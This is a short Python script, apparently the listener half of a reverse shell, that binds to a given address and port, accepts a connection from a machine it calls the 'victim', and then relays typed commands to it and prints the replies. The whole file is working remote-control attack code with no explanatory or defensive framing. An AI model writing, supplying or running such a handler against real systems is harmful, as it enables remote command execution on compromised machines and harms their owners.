import socket
import sys

ip = sys.argv[1]
port = sys.argv[2]
attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
attacker.bind((ip, int(port)))
attacker.listen(1)
print(f'Listening on {ip}:{port}')
victim, victim_ip = attacker.accept()
print(f'Connection from {victim_ip}')
try:
    while True:
        cmd = input("$ ")
        victim.send(cmd.encode())#Command sent..
        op = victim.recv(4096)
        print(op.decode())
        
except KeyboardInterrupt:
    attacker.close()
    sys.exit()






